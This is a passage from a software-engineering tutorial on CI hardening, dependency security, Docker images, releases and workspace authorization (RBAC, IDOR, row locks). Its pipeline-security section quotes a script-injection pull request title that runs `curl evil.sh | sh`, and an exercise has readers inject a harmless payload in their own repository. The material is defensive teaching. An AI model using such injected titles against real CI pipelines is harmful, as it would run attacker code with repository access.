**Git hooks** are scripts Git runs at certain moments. **Husky** installs them when you run
`npm install`:

- **pre-commit** runs **lint-staged**: ESLint and Prettier on the files you staged only, so
  it takes seconds.
- **commit-msg** runs **commitlint** on your message.
- **pre-push** runs the type checker.

Anyone can skip hooks with `git commit --no-verify`. That's fine: hooks are a convenience that
catches problems early, and CI is the real gate.

**Conventional Commits** gives every commit message the same shape, `type(scope): summary`:

```
feat(auth): add logout from all devices
fix(workspaces): return 404 for a malformed id
docs(learning): add chapter 3
```

The history becomes readable at a glance, and tools can generate changelogs and pick the next
version number from it (`feat` means a new minor version, `fix` a patch, `!` a major). CI
checks every commit of a pull request, and a small workflow of its own, `pr-title.yml`, checks
the title. It runs again whenever the title is edited: re-running an old check wouldn't help,
because a run always uses the title it started with. Dependabot is the one exception: it titles
grouped updates "Bump the … group", with a capital even after the lowercase prefix that
`dependabot.yml` sets, so its titles and commits aren't checked (that prefix still gives them
the right type and scope).

### Concept 6: How a GitHub Actions workflow works

A **workflow** is a YAML file in `.github/workflows/`. It says **when** to run (`on:`), and
what to run as **jobs**. Each job runs on a fresh virtual machine (a **runner**), in parallel
with the other jobs, as a list of **steps**. A step is either a shell command (`run:`) or a
reusable **action** (`uses:`). Our `ci.yml` runs five jobs at the same time:

```
pull request ─┬─ Format, lint and types
              ├─ Commit messages
              ├─ Tests and coverage ──── with a Postgres service container
              ├─ Dependency audit
              └─ Docker image ─────────── build → migrate → start → call the API → scan both images
```

Some details worth knowing:

- **Service containers** (`services:`) start a throwaway Postgres next to the job, the same
  way `docker compose` does on your machine.
- **Concurrency:** a new push to a pull request cancels the run still checking the old commit.
- **Timeouts:** every job has `timeout-minutes`, so a hung job can't run for 6 hours
  (rule 2 again).
- **Job summary:** the coverage table is written to `$GITHUB_STEP_SUMMARY`, so it shows up on
  the run's page.
- **Reusable workflow:** `ci.yml` also has `on: workflow_call`, so the release workflow reuses
  it instead of duplicating it.

### Concept 7: Securing the pipeline itself

CI runs code with access to your repository, so it's a favorite target for attackers. Four
habits protect it:

1. **Least privilege.** Every workflow starts with a read-only token:
   `permissions: contents: read`, or `read-all` in `scorecard.yml`, as in Scorecard's own
   example: it reads many parts of the repository, and writes none. A job that needs more
   asks for exactly that: CodeQL gets `security-events: write`, the image job
   `packages: write`. If a step of a read-only job is compromised, it can't push code. The one
   job that can write to the repository (it creates the GitHub release) runs no action and no
   code from the repository, only the GitHub CLI, so no third-party code ever holds that
   token.
2. **Pin actions to a commit SHA.** `uses: actions/checkout@v7` points to a _tag_, and tags
   can be moved. In March 2025, attackers moved the tags of the popular
   `tj-actions/changed-files` action to malicious code that printed CI secrets into public
   logs, in thousands of repositories. A commit SHA can't be moved:
   `uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1`. Dependabot
   updates the SHAs for us.
3. **Never paste untrusted text into a script.** Anyone can open a pull request with the
   title `"; curl evil.sh | sh; "`. If a workflow does `run: echo "${{ github.event.pull_request.title }}"`,
   that title becomes part of the script. So the title goes through an environment variable,
   which the shell treats as data:

   ```yaml
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   run: printf '%s\n' "$PR_TITLE" | npx --no -- commitlint
   ```

4. **Don't leave credentials lying around.** By default `actions/checkout` keeps the token on
   the runner after cloning, so later Git commands can use it. Since checkout v6 it sits in a
   credentials file under `$RUNNER_TEMP` that `.git/config` points to. Any later step could
   read it from there, so `persist-credentials: false` tells checkout not to keep it.

CodeQL also scans the workflow files (the `actions` language), and OpenSSF Scorecard checks
all of this every week.

### Concept 8: Your dependencies are your code

`package-lock.json` lists about 500 packages. Any of them can have a vulnerability, or be
taken over by an attacker. Each layer catches something different:

| Tool                   | What it does                                                                                           |
| ---------------------- | ------------------------------------------------------------------------------------------------------ |
| `npm ci` + lockfile    | Installs exactly the locked versions, and checks each download against its hash                        |
| `npm audit`            | Fails CI if a production dependency has a known high or critical vulnerability                         |
| `npm audit signatures` | Verifies every package was signed by the npm registry, so it wasn't modified                           |
| Dependency review      | Blocks a pull request that adds or updates a vulnerable dependency, or brings in an unexpected license |
| Dependabot             | Opens weekly pull requests with updates, and immediate ones for security fixes                         |
| `overrides`            | Forces a fixed version of a nested dependency when its parent hasn't updated yet                       |

We used the last one already. `npm audit` reported a known vulnerability in `minimatch`, a
package that `eslint-plugin-sonarjs` depends on. SonarJS hadn't released a fix, so
`package.json` tells npm to use a fixed version anyway:

```json
"overrides": { "eslint-plugin-sonarjs": { "minimatch": "^11.0.9" } }
```

It happened again a few days later, and that's normal: advisories are published every day,
for code that didn't change. `npm audit` started failing on a ReDoS (a regular expression
that can run for a very long time on crafted input) in `effect`, which the Prisma CLI pins
at an old version through `@prisma/config`. No Prisma 7 release had the fix yet, and npm's
own suggestion was a downgrade to Prisma 6. So a second override raises `effect` to the
first fixed version or later:

```json
"@prisma/config": { "effect": "^3.22.1" }
```

An override is a promise to check back: once Prisma ships the fix, it can go.

Licenses matter too: dependency review only allows licenses that are compatible with a
project shipped under MIT. The list is in `dependency-review.yml`, and growing it is a
decision to write down. When the Dependency graph was turned on and dependency review
really ran for the first time, it stopped at `uri-js`, which ESLint uses: its license is
BSD-2-Clause plus one sentence saying that the authors' views aren't official policy
(SPDX calls it `BSD-2-Clause-Views`). That sentence adds no obligation, so the license
joined the list, with that reason in a comment next to it.

Development dependencies count. Dependency review checks only production (runtime)
dependencies unless you ask for more, but ESLint plugins and test tools run on your machine and
in CI, with access to the code. So `fail-on-scopes` includes development dependencies too.

### Concept 9: Static analysis for security with CodeQL

Linters look at code patterns. **CodeQL** goes further: it builds a database of the whole
program and follows how data flows through it. It knows that `request.body` is controlled by
the user, and reports when that data can reach a dangerous place (a raw SQL string, a file
path, a redirect) without being cleaned on the way. It runs on every pull request and every
Monday, because new queries can find problems in code that hasn't changed. Results appear in
the repository's **Security** tab and as annotations on the pull request.

### Concept 10: A hardened Docker image

The image got several upgrades:

- **Node.js 26 LTS.** Even-numbered Node.js versions become LTS (long-term support), and
  production should run one. Node.js 22 stops getting security fixes in April 2027, so we
  moved to 26, the current Active LTS line. `.nvmrc`, CI and the Dockerfile all use it.
- **Pinned by digest.** `FROM node:26-alpine@sha256:6bd9…` is an exact, unchangeable image.
  The tag `node:26-alpine` alone would give you a different image every week. Dependabot
  opens a pull request when a new digest is published, so you still get updates, but
  reviewed and tested.
- **Smaller.** `@prisma/client` lists the Prisma CLI as an _optional peer dependency_, so
  `npm prune --omit=dev` kept the CLI and Prisma Studio in the image. Adding `--omit=optional`
  took `node_modules` from 357 MB to 107 MB. Less code shipped is less code that can have a
  vulnerability.
- **No npm in production.** The final stage deletes npm, npx, corepack and yarn: the app
  never installs anything at runtime. Alpine's own package manager, `apk`, stays, but only
  root can use it, and the container runs as the unprivileged `node` user. The stage also
  runs `apk upgrade` to install the latest Alpine security fixes.
- **Two images, both hardened.** The migration image needs the Prisma CLI, which is a
  development dependency, so it is bigger. It's published too, so it gets the same
  treatment: it runs as `node`, gets `apk upgrade`, deletes npm and starts the CLI directly
  (`node_modules/.bin/prisma migrate deploy`) instead of through `npx`, and it is scanned.
  The first CI run showed why the npm part matters. npm carries its own copies of the
  packages it uses, and Trivy found six high-severity vulnerabilities in two of them
  (`brace-expansion` and `undici`) in the migration image, which still had npm. The API
  image, without npm, was clean.
- **A smoke test in CI.** "It builds" doesn't mean "it runs". The Docker job runs the
  migration image against a real Postgres, starts the API image, waits for
  `/health/ready`, and registers a user. That catches a missing file, a native module built
  for the wrong system, or a migration that fails.
- **A vulnerability scan.** **Trivy** lists every package in each image (Alpine packages and
  npm packages) and compares them with vulnerability databases. CI fails on any high or
  critical vulnerability that has a fix available.

### Concept 11: Releases: versions, changelog, tags

A **release** is a version of the API that you can deploy and refer to later.

- **Semantic Versioning** (`MAJOR.MINOR.PATCH`): for an API, MAJOR means existing clients
  must change (a field renamed), MINOR adds something backward-compatible (a new endpoint),
  PATCH fixes a bug.
- **CHANGELOG.md** follows [Keep a Changelog](https://keepachangelog.com): changes are written
  under `[Unreleased]` as they're merged, and moved under a version heading at release time.
  It's written for humans: "Added", "Fixed", "Security", not a dump of commit messages.
- **A Git tag** (`v1.2.0`) marks the exact commit that was released. Pushing it starts
  `release.yml`, which checks that the tag matches `package.json` and `CHANGELOG.md`, reruns
  the whole CI pipeline on that commit, publishes the API and migration images to GitHub
  Container Registry, and creates a GitHub release with the changelog notes.

The images are published with **provenance** (a record of how and where they were built:
which workflow, from which commit) and an **SBOM** (software bill of materials: the list of
every package inside). Both are attached to the image, which tells you what's in it. They
aren't signed, though, so they aren't _proof_: someone who could push to the package could
replace the image and its provenance together. Signing them (with GitHub's artifact
attestations or Sigstore's cosign) is what lets anyone verify where an image came from. That's
an exercise below.

### Concept 12: The documents of a professional repository

| File                              | Why it exists                                                                         |
| --------------------------------- | ------------------------------------------------------------------------------------- |
| `README.md` badges                | The project's health at a glance: CI status, security score, license, versions        |
| `CONTRIBUTING.md`                 | How to set up, the workflow, the rules and how to release: onboarding in one page     |
| `SECURITY.md`                     | How to report a vulnerability _privately_, so it's fixed before it's public           |
| `CODE_OF_CONDUCT.md`              | How people are expected to treat each other, and what happens if they don't           |
| `CHANGELOG.md`                    | What changed in each version, for the people who use the API                          |
| Issue forms and PR template       | Every bug report has the steps to reproduce; every PR has a test plan and a checklist |
| `CODEOWNERS`                      | GitHub automatically asks the right person to review                                  |
| `LICENSE`                         | What others may legally do with the code                                              |
| `.editorconfig`, `.gitattributes` | Same indentation and line endings on every editor and operating system                |

Some protections are settings, not files. In the repository settings: **rulesets** that
require CI to pass before merging into `main`, **secret scanning with push protection**
(GitHub refuses a push that contains an API key), **private vulnerability reporting** (the
form SECURITY.md links to) and **Dependabot alerts**.

### Build it yourself

1. Install Prettier, add `.prettierrc.json`, run `npx prettier --write .` and look at the
   diff.
2. Install ESLint and typescript-eslint. Start from `strictTypeChecked`, run
   `npx eslint .` and fix what it finds, one rule at a time.
3. Switch on the strict `tsconfig.json` options one by one, and fix the errors each one
   shows you. Which one found the most problems?
4. Add the Power of Ten rules to `eslint.config.js`, with a comment saying which rule each
   line enforces.
5. Write `no-recursion.js` with its `RuleTester` tests. Start with the test cases.
6. Create `limits.ts`, wire each limit into Fastify and the Prisma adapter, and write
   `input-bounds.test.ts`.
7. Add Husky, lint-staged and commitlint. Try committing with the message `stuff`.
8. Write `ci.yml` with just the tests job, open a pull request, watch it run. Then add the
   other jobs one at a time.
9. Add CodeQL, dependency review, Scorecard and Dependabot, pinning every action by SHA.
10. Write `release.yml`, then the documents: CONTRIBUTING, SECURITY, CHANGELOG, templates.

### Exercises

1. **Break the rules.** Write a recursive `factorial(n)` in `src/`, and a `while (true)`
   loop. Run `npm run lint`. Then rewrite both to pass, and explain the bound you chose.
2. **Indirect recursion.** Extend `no-recursion.js` to catch `a` calling `b` calling `a` in
   the same file. Hint: build a map from each function to the names it calls, then look for
   a cycle with an explicit stack (no recursion in the rule itself!).
3. **Find the limits.** Write tests showing that a 65 KB body gets `413` and a 321-character
   email gets `400`. Which limit catches each one?
4. **Script injection lab.** In a repository of your own, write a workflow that runs
   `echo "${{ github.event.pull_request.title }}"`, and open a pull request titled
   `x"; echo INJECTED; echo "`. Find `INJECTED` in the log. Then fix it with an environment
   variable and check again.
5. **Read a scan.** Build the image and scan it locally:
   `docker build -t api . && docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image api`.
   Then scan `node:26` (not Alpine). Why is the difference so big?
6. **Make a release.** Follow "Releasing" in CONTRIBUTING.md to publish `v1.0.0`, and watch
   each job of the release workflow. (`package.json` already says `1.0.0`, so skip the
   version bump.)
7. **Sign the images.** Add `actions/attest-build-provenance` to the images job (it needs
   `id-token: write` and `attestations: write`), make a release, and verify an image with
   `gh attestation verify oci://ghcr.io/<owner>/production-rest-api:1.0.0 --owner <owner>`.
8. **Clean up history.** Write a job that deletes refresh tokens that expired more than a day
   ago, at most 1,000 rows per run. Postgres has no `DELETE ... LIMIT`: select the ids first.
   Should it run inside the API on a timer, or as its own scheduled job, like the migration
   image? What happens if two copies of the API run it at the same time?
9. **Think about it.** Why does the release workflow rerun CI instead of trusting the pull
   request's green check? Why ban `while` but allow `for...of`? Why is a high coverage
   number not proof that the code is well tested?

### Words to know

quality gate · shift left · formatter · linter · type-aware linting · static analysis ·
cyclomatic complexity · cognitive complexity · AST · invariant · assertion ·
bounded resource · Git hook · Conventional Commits · CI/CD · workflow · job · step · runner ·
service container · least privilege · SHA pinning · script injection · supply chain ·
lockfile · CVE · dependency review · CodeQL · Trivy · LTS · image digest · smoke test ·
Semantic Versioning · changelog · provenance · SBOM

---

## Chapter 4: Workspaces, members and permissions

### What we built

Teams can now share a private space. A **workspace** has members, and each member has one
role: `OWNER`, `ADMIN` or `MEMBER`.

```
POST   /workspaces                                    create (you become OWNER)
GET    /workspaces                                    the workspaces you're in, with your role
GET    /workspaces/:workspaceId                       read one
PATCH  /workspaces/:workspaceId                       rename           (ADMIN+)
DELETE /workspaces/:workspaceId                       delete           (OWNER)

GET    /workspaces/:workspaceId/members               list members
PATCH  /workspaces/:workspaceId/members/:userId       change a role    (OWNER)
DELETE /workspaces/:workspaceId/members/:userId       remove someone, or yourself (= leave)

POST   /workspaces/:workspaceId/invitations           invite by email  (ADMIN+), returns a token once
GET    /workspaces/:workspaceId/invitations           pending invitations (ADMIN+)
DELETE /workspaces/:workspaceId/invitations/:id       revoke           (ADMIN+)
POST   /invitations/accept                            join with a token
```

Step 5's projects and tasks will live _inside_ workspaces, so this chapter is the security
foundation for everything after it.

### New files

```
prisma/migrations/…_workspaces/migration.sql
src/modules/workspaces/workspaces.policy.ts    # THE permission rules, in one file
src/modules/workspaces/workspaces.access.ts    # membership checks + the row lock
src/modules/workspaces/workspaces.service.ts   # workspaces logic
src/modules/workspaces/workspaces.routes.ts
src/modules/workspaces/members.service.ts      # members logic: roles, removal, leaving
src/modules/workspaces/members.routes.ts
src/modules/invitations/…                      # invitations: schemas, service, routes
test/workspaces.policy.test.ts                 # unit tests of the rules (no DB)
test/workspaces.test.ts, test/invitations.test.ts
test/limits.test.ts                            # the quotas, including under concurrency
```

### Concept 1: Authentication vs authorization

- **Authentication** (chapter 2): _who are you?_ Fails with **401 Unauthorized**.
- **Authorization** (this chapter): _are you allowed to do this?_ Fails with **403 Forbidden**.

Most serious API security bugs are authorization bugs: the user is logged in correctly, but
the code forgets to check that _this_ user may touch _this_ record.

### Concept 2: Multi-tenancy and the membership table

A **tenant** is a customer's private slice of a shared system (here: a workspace). The
golden rule of multi-tenant apps: **every query is scoped to a tenant the caller belongs to**.

Users and workspaces are many-to-many (a user can be in many workspaces, a workspace has
many users). In SQL that's a **join table**, and ours carries extra data, the role:

```
memberships (workspace_id, user_id, role, created_at)
             └──── primary key ────┘
```

The **composite primary key** `(workspace_id, user_id)` means the database itself makes it
impossible to be a member twice.

Notice `onDelete` choices in `schema.prisma`:

- deleting a workspace **cascades** to its memberships and invitations,
- deleting a user is **restricted** while they're still in a workspace. If we ever add
  "delete my account", the database forces us to handle ownership first, so a team can
  never be silently left without an owner.

### Concept 3: Role-based access control (RBAC), in one file

Open `workspaces.policy.ts`. The entire permission model is a small table:

| Action                                               | Minimum role |
| ---------------------------------------------------- | ------------ |
| read workspace, list members                         | MEMBER       |
| rename workspace, remove members, manage invitations | ADMIN        |
| change roles, delete workspace                       | OWNER        |

plus one more rule, `outranks(actor, target)`: **you can only act on people (or invitations)
with a lower role than yours, or on yourself.** So an admin can remove a member but not another
admin or an owner, and can invite members but not admins. An owner can change the role of
admins and members, but not of another owner: co-owners are equals. The only way an owner
stops being one is their own choice, stepping down or leaving, and never as the last owner.

Why put this in one file instead of `if (role === 'ADMIN')` checks in each route?

- You can read the whole security model in one screen.
- Changing a rule is a one-line change.
- It's **pure** (no DB, no HTTP), so `workspaces.policy.test.ts` tests every
  role/action combination in milliseconds. That test file _is_ the spec.

### Concept 4: 404 for outsiders, 403 for members

If Dave (not a member) asks for Acme's workspace, he gets **404 Not Found**, exactly the same
response as for an id that doesn't exist (a test compares the two bodies). If Carol (a
member) tries to rename it, she gets **403 Forbidden**.

Why the difference? Carol already knows the workspace exists, so 403 tells her nothing new.
For Dave, a 403 would confirm "yes, something lives at this id", which leaks information.
GitHub does the same: private repos you can't see are 404, not 403.

### Concept 5: IDOR, the most common API vulnerability

**IDOR** (Insecure Direct Object Reference): the code fetches a record by the id in the URL
without checking it belongs to the caller. It's #1 on the OWASP API Security Top 10 (called
"Broken Object Level Authorization" there).

Look at `revoke()` in `invitations.service.ts`:

```ts
await prisma.invitation.findFirst({ where: { id: invitationId, workspaceId, … } });
```

If it used only `id: invitationId`, Dave could create his own workspace (where he's owner, so
he passes the permission check) and then call
`DELETE /workspaces/<his workspace>/invitations/<Acme's invitation id>`. The permission check
would be for _his_ workspace, but the delete would hit _Acme's_ invitation. Scoping the
query by both ids closes that hole; the "IDOR" test in `invitations.test.ts` proves it.

**Habit to build:** whenever a URL contains a parent id and a child id, the query must
include both.

### Concept 6: Invariants and race conditions

An **invariant** is something that must _always_ be true. Ours: _every workspace has at
least one owner_. The obvious code is:

```
count owners → if more than 1, allow the owner to leave → delete membership
```

Now imagine Alice and Bob, the only two owners, both click "Leave" at the same instant:

```
Alice's request: count owners = 2 ✓ ......... delete Alice
Bob's request:   count owners = 2 ✓ ......... delete Bob        → zero owners!
```

Each check was true when it ran, but by the time each acted, the world had changed. This
bug class is called **TOCTOU** (time-of-check to time-of-use), and it's real: the test
"keeps one owner even when two owners leave at the same instant" fails every time if you
remove the fix (with the warm connection pool from chapter 3; see Concept 12).

**The fix: a transaction plus a row lock.** Every operation that changes membership runs
inside `prisma.$transaction(...)` and first does:

```sql
SELECT id FROM workspaces WHERE id = $1 FOR UPDATE
```

`FOR UPDATE` locks that workspace row until the transaction ends. A second request for the
same workspace waits at that line until the first one commits. So the operations happen one
at a time per workspace (other workspaces aren't affected), and the second one counts
owners _after_ the first has finished. (Chapter 5 adds a shared version of this lock for
task writes, and with it replaces the row lock by an advisory lock, which keeps a fair
queue. Chapter 5, Concept 11, explains why.)

Two details matter:

1. **Lock first, then read.** Everything the decision depends on is read _after_ taking the
   lock. In the "two owners step down at the same instant" test, the second request counts
   the owners after the first one has committed, finds its caller is now the last owner, and
   gets 409. The caller's own role is re-read the same way: if Alice demotes Bob while Bob is
   removing Carol, Bob's request either finishes first or sees that he is no longer an admin.
2. We lock the **parent** (workspace) row, not the membership rows, because "how many
   owners are there?" is a question about a _set_ of rows, including rows that might be
   inserted. Locking one parent row is the simplest way to serialize changes to that set.

Even renaming takes the lock. Without it, a rename could pass its permission check, then wait
for a delete that was already running, and find no row left to update: a 500 instead of a 404. The test "answers 404, never 500, when a rename races a delete" covers it. Reads don't
lock: they can't break an invariant.

### Concept 7: Invitations

Inviting is the most security-sensitive feature here, so it combines several earlier ideas:

- **Secret token, stored hashed.** Like refresh tokens (chapter 2): 32 random bytes, only
  the SHA-256 hash is saved. Code is shared in `src/lib/tokens.ts`.
- **Shown once.** The token appears only in the response to the inviter (like an API key).
  A real product would email a link; we return it so the inviter can share it.
- **Bound to an email.** Accepting needs the token _and_ being logged in with the invited
  email. If the invitee already has an account, a leaked link is useless to anyone else, and
  a mismatch doesn't burn the invitation (the "different account" test).
- **Expires** after `INVITATION_TTL_DAYS` (7), and **single-use**: accepting runs under the
  workspace lock and marks the invitation used with the same conditional-update trick as
  refresh token rotation, so two simultaneous accepts can't both succeed.
- **OWNER can't be invited.** That's a rule about the input's _shape_, so the Zod schema
  rejects it with 400. Ownership only comes from an existing owner promoting a member.
- **One pending invitation per email.** Revoke the old one before sending a new one.

> **A known gap, on purpose:** we don't verify email addresses at sign-up, so anyone can
> register as `erin@example.com` without owning that inbox. If Erin has no account yet,
> whoever gets her invitation link can register her email first, accept, and join with the
> invited role, even ADMIN, and Erin can no longer sign up. So until emails are verified,
> the link itself is the secret: share it only with the person invited, like a password. A
> real product would verify emails before accepting (Exercise 4).

### Concept 8: Atomic nested writes

Creating a workspace also creates the creator's OWNER membership:

```ts
prisma.workspace.create({
  data: { name, memberships: { create: { userId, role: 'OWNER' } } },
});
```

Prisma runs nested writes in one transaction, so there's never a moment where the workspace
exists without an owner, even if the server crashes halfway.

### Concept 9: Validate path parameters too

`/workspaces/not-a-uuid` would make Postgres throw "invalid input syntax for type uuid",
which our error handler would turn into a 500. Declaring `params: z.object({ workspaceId:
z.uuid() })` turns it into a clean 400 before any query runs. **Everything** the client
sends is input: body, query string, headers, _and_ the URL path.

### Concept 10: List responses use an envelope

`GET /workspaces` returns `{ "data": [ … ] }`, not a bare array. Chapter 5 adds
pagination to the project and task lists as `{ "data": [...], "nextCursor": "…" }`. With an
envelope that's a new field; with a bare array it would have been a breaking change for
every client.

### Concept 11: Testing authorization

Authorization bugs hide in the combinations, so the tests are organized around a cast:
`createTeam()` builds **Alice (OWNER), Bob (ADMIN), Carol (MEMBER)** in workspace Acme,
plus **Dave**, who isn't a member. Bob and Carol join through the real invitation flow.

For each endpoint we check the allowed role succeeds, the next role down gets **403**, and
Dave gets **404**. Then we test the invariants (last owner, IDOR, simultaneous requests).

### Concept 12: The Power of Ten rules in this chapter

This is the first feature built under the rules from chapter 3, and they shaped it:

**Rule 3: quotas.** Without limits, one script could create a million workspaces or fill a
workspace with a million pending invitations, and `GET /workspaces` would try to return all
of them in one response. So:

| Quota                              | Default | Setting                     |
| ---------------------------------- | ------- | --------------------------- |
| Workspaces a user can belong to    | 50      | `MAX_WORKSPACES_PER_USER`   |
| Members in a workspace             | 200     | `MAX_MEMBERS_PER_WORKSPACE` |
| Pending invitations in a workspace | 50      | `MAX_PENDING_INVITATIONS`   |

Going over a quota returns `409 LIMIT_REACHED`. Each setting is itself capped at
`LIMITS.listMax` (1,000), and every list query has a `take:` with the quota, so no list the
API returns can ever be unbounded. Step 5 adds pagination for lists that need to be longer.

The quotas bound what exists _at once_, not **history**. Revoked, expired and accepted
invitations stay in the table, like old refresh tokens (chapter 3), so an admin who invites
and revokes in a loop still adds rows. A scheduled cleanup (chapter 3, Exercise 8) and a rate
limit on inviting would close that.

**A quota check is a race, too.** It's the same time-of-check to time-of-use problem as the
last owner: two "create workspace" requests could both count 49 workspaces, and both insert.
So `create()` locks the user's row before counting, and accepting an invitation locks the
workspace and then the user. Always in that order: if one transaction locked A then B while
another locked B then A, each would wait for the other forever (a **deadlock**). Postgres
detects deadlocks and aborts one of the transactions, but a fixed lock order means they
can't happen at all. Race tests fire simultaneous requests at the last free slot (a
workspace, a seat, a pending invitation) and check that exactly one wins.

Race tests have a trap (chapter 3, Concept 4), and we fell into it here too. The first
version of the "creations at the same instant" test passed even with the lock removed! The
first request reused an idle database connection, while the others had to open new ones,
which took long enough for the first request to finish before the others started. The race
never happened. Now every race test calls `warmUpPool()` first, and each was checked both
ways: it fails without its lock and passes with it. One race is lost only most of the time
without the lock (inviting runs several queries before it counts), so that test runs it three
times. **Always check that a race test fails without the fix**, or it proves nothing.

**Rule 5: preconditions and post-conditions.** `assertAnotherOwnerExists()` is a
**precondition**: it refuses a request that would remove the last owner, with
`409 LAST_OWNER`, because that's the user's mistake. After the change,
`checkWorkspaceHasOwner()` checks the **post-condition** with `invariant()`: the workspace
still has an owner. If that ever fails, the precondition has a bug, so the transaction rolls
back and the client gets a 500.

A post-condition only sees its own transaction, though, so it can't replace the lock. We
removed the lock and made two owners step down at once: each transaction counted the other
owner (whose change it couldn't see yet), both passed the check, and the workspace was left
with no owner in most runs. **Locks prevent races; assertions catch logic bugs.** A new
endpoint that changes members must take the lock too.

**Rule 4: small functions.** The routes plugin had grown to 70 lines, so members got their own
plugin and service (`members.routes.ts`, `members.service.ts`), and `accept()` is split into
small private steps, each with one job.

**Rule 7: say what you mean.** Every "not found" check is an explicit `=== null`, and
`test/input-bounds.test.ts` now checks the workspace and invitation schemas too.

### What the review found

Before this step was merged, an independent review tried to break it. It found real
problems, and all of them are fixed now:

| Problem found                                                                    | Fix                                                                                 |
| -------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| An owner could demote a co-owner, and then remove them                           | Role changes follow the same rule as removal: only lower roles, or yourself         |
| Renaming a workspace while it was being deleted answered 500                     | The rename takes the workspace lock first, so it answers 200 or 404                 |
| Some race tests still passed with their locks removed                            | Every race test warms up the pool and was checked to fail without its fix           |
| Inviting had no race test, and three endpoints had no 403 or 404 test            | New tests for both, so every endpoint is covered for each role                      |
| The docs promised too much (a leaked link, the post-condition, unbounded growth) | Corrected in Concepts 7 and 12, and listed in `SECURITY.md` under known limitations |

All the tests passed before these fixes: tests only check what someone thought of. A
reviewer who sets out to break the code finds the rest. That is what reviews are for.

### Build it yourself

1. Add `Workspace` and `Membership` with the enum, migrate, and read the SQL.
2. `POST /workspaces` with the nested write; `GET /workspaces` listing your memberships.
3. Write `can()` and its unit tests _first_, then use it in `PATCH` and `DELETE`.
4. Add `GET /workspaces/:id` and write the "outsider gets the same 404 as a missing id"
   test.
5. Add member role changes and removal with the "last owner" check, _without_ the lock.
   Write the "two owners leave at the same instant" test, with `warmUpPool()` before the
   `Promise.all`, and watch it fail. Then add the transaction and `FOR UPDATE`, and watch it
   pass.
6. Add invitations: create (token once, hash stored), accept (email must match), revoke
   (scoped by workspace: write the IDOR test).
7. Add the quotas. Write the "two creations at the same instant" test first, watch it fail
   without `lockUser()`, then add the lock.

### Exercises

1. **Transfer ownership in one call.** Add `POST /workspaces/:id/transfer-ownership
{ userId }` that makes the target an OWNER and the caller an ADMIN, atomically. Which
   lock do you need? What if the target isn't a member?
2. **My invitations.** Add `GET /users/me/invitations` listing pending invitations sent to
   the caller's email, so people can find them without a link. Is it safe to return the
   workspace name? What about the token?
3. **Audit log.** Create an `audit_events` table (who, what, when, workspace) and record
   every role change and removal. Write it in the _same_ transaction as the change. Why?
4. **Email verification.** Add `emailVerifiedAt` to users and require it in `accept()`.
   How would you test it without sending real emails?
5. **Show the quota.** Make `GET /workspaces` return `{ "data": [...], "limit": 50 }` so a
   client can show "3 of 50 workspaces". Is that a breaking change? (Hint: Concept 10.)
6. **Lock strength.** Postgres also has `FOR NO KEY UPDATE`, a weaker lock that doesn't
   block other transactions inserting rows that reference the workspace (their foreign key
   check takes a `FOR KEY SHARE` lock). Read the "Row-level locks" table in the Postgres
   docs. Would it still protect our invariants? What would it improve once projects and
   tasks reference workspaces?
7. **Think about it.** We lock the workspace row with `FOR UPDATE`. Another option is running
   the transaction at the `SERIALIZABLE` isolation level. What would change, and what would
   your code need to do when Postgres aborts a transaction with a serialization error?

### Words to know

authentication vs authorization · tenant / multi-tenancy · join table · composite primary
key · ON DELETE CASCADE / RESTRICT / SET NULL · RBAC · least privilege · policy · 403 vs 404 ·
IDOR / BOLA · invariant · race condition · TOCTOU · transaction · row lock (`FOR UPDATE`) ·
serialization · conditional update · nested write · response envelope · quota ·
lock ordering · deadlock · precondition · post-condition

---

## Chapter 5: Projects and tasks: pagination, filtering, sorting

### What we built

Workspaces now hold the actual work. A workspace has **projects**, and a project has
**tasks**:

```
POST   /workspaces/:workspaceId/projects                    create             (ADMIN+)
GET    /workspaces/:workspaceId/projects                    list, oldest first, a page at a time
GET    /workspaces/:workspaceId/projects/:projectId         read one
PATCH  /workspaces/:workspaceId/projects/:projectId         rename, describe   (ADMIN+)
DELETE /workspaces/:workspaceId/projects/:projectId         delete, tasks too  (ADMIN+)

POST   /workspaces/:workspaceId/projects/:projectId/tasks   create             (any member)
GET    /workspaces/:workspaceId/projects/:projectId/tasks   filter, sort, a page at a time
GET    …/tasks/:taskId                                      read one
PATCH  …/tasks/:taskId                                      edit               (any member)
DELETE …/tasks/:taskId                                      delete             (its creator, or ADMIN+)
```

A task has a title, a description, a status (`TODO`, `IN_PROGRESS`, `DONE`), a priority
(`LOW`, `MEDIUM`, `HIGH`), an optional due date, and an optional assignee, who must be a
member of the workspace.

The task list is where this chapter's real lessons are:

```
GET …/tasks?status=TODO,IN_PROGRESS&sort=dueDate&order=asc&limit=2

{
  "data": [
    { "id": "…", "title": "Write the README", "status": "TODO", "dueDate": "2026-11-30", … },
    { "id": "…", "title": "Pick a logo", "status": "IN_PROGRESS", "dueDate": "2026-12-01", … }
  ],
  "nextCursor": "eyJzY29wZSI6InRhc2tzOjdjMWU0YTUyLTNkNTUtNGYwZS04YTc3LTJiOWU2ZjFkMGMzMyIsInNvcnQiOiJkdWVEYXRlIiwib3JkZXIiOiJhc2MiLCJ2YWx1ZSI6IjIwMjYtMTItMDEiLCJpZCI6IjBiOWQ2YzQzLThjNTUtNGM0ZS05ZTBlLTdmOWEzZTBmMmExMSJ9"
}
```

To get the next page, send the same request with `&cursor=<nextCursor>`. When `nextCursor`
is `null`, there are no more pages.

| Parameter            | Values                                        | Default      |
| -------------------- | --------------------------------------------- | ------------ |
| `limit`              | 1 to 100                                      | 20           |
| `cursor`             | the `nextCursor` of the previous page         | (first page) |
| `sort`               | `createdAt`, `updatedAt`, `dueDate`           | `createdAt`  |
| `order`              | `asc`, `desc`                                 | `desc`       |
| `status`, `priority` | one or more values, separated by commas       | all          |
| `assigneeId`         | a member's id, or `none` for unassigned tasks | all          |
| `dueFrom`, `dueTo`   | days like `2026-12-31`, both days included    | none         |
| `q`                  | text the title contains (case doesn't matter) | none         |

### New files

```
prisma/migrations/…_projects_and_tasks/migration.sql
src/lib/pagination.ts                      # cursors, page size, "ask for one more row"
src/lib/dates.ts                           # calendar dates ("2026-12-31")
src/lib/text.ts                            # Text: string inputs, without NUL or half characters
src/lib/ids.ts                             # Id: the uuids clients send, lower-cased
src/modules/projects/projects.access.ts    # requireProject() and lockProject()
src/modules/projects/…                     # projects: schemas, service, routes
